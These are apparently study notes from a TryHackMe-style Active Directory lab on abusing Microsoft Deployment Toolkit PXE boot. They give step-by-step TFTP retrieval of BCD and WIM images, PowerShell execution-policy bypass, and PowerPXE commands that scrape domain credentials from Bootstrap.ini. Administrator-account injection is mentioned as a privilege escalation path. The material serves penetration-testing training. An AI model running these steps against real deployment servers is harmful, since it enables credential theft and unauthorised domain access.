`Microsoft Deployment Toolkit (MDT)` is a Microsoft service that assists with *automating the deployment of Microsoft Operating Systems (OS)*. Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

Usually, MDT is integrated with `Microsoft's System Center Configuration Manager (SCCM)`, which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. Essentially it allows the IT team to preconfigure and manage boot images. Hence, if they need to configure a new machine, they just need to plug in a network cable, and everything happens automatically. They can make various changes to the boot image, such as already installing default software like Office365 and the organisation's anti-virus of choice. It can also ensure that the new build is updated the first time the installation runs.


## PXE Boot  
Large organisations use PXE boot to *allow new devices that are connected to the network to load and install the OS directly over a network connection*. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below:
![[Pasted image 20230705234739.png]]

Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:
-   Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
-   Perform password scraping attacks to recover AD credentials used during the install.


### PXE Boot Image Retrieval
The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the `IP` of the MDT server.
The second piece of information you would have received was the **names of the BCD files**. These files store the information relevant to PXE Boots for the different types of architecture.
![[Pasted image 20230705235001.png]]
Usually, you would use `TFTP` to request each of these BCD files and enumerate the configuration for all of them. However, in the interest of time, we will focus on the BCD file of the **x64** architecture.

```powershell
C:\Users\THM>cd Documents 
C:\Users\THM\Documents> mkdir <username> 
C:\Users\THM\Documents> copy C:\powerpxe <username>\ 
C:\Users\THM\Documents\> cd <username>
```

The first step we need to perform is using `TFTP` and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we <mark style="background: #FF5582A6;">can't list files</mark>. Instead, we send a file request, and the server will connect back to us via `UDP` to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the `/Tmp/` directory on the MDT server.

```powershell
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd 
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
```

**Powerpxe** is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the `Get-WimFile` function of powerpxe to recover the locations of the PXE Boot images from the BCD file:
```powershell
C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass 
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved. 
PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1 
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile 
>> Parse the BCD file: conf.bcd 
>>>> Identify wim file : <PXE Boot Image Location> 
<PXE Boot Image Location>
```

WIM files are bootable images in the `Windows Imaging Format (WIM)`. Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
```powershell
PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim 
Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
```

### Recovering Credentials from a PXE Boot Image
```powershell
PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim 
>> Open pxeboot.wim 
>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = <account>
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = <password>
```
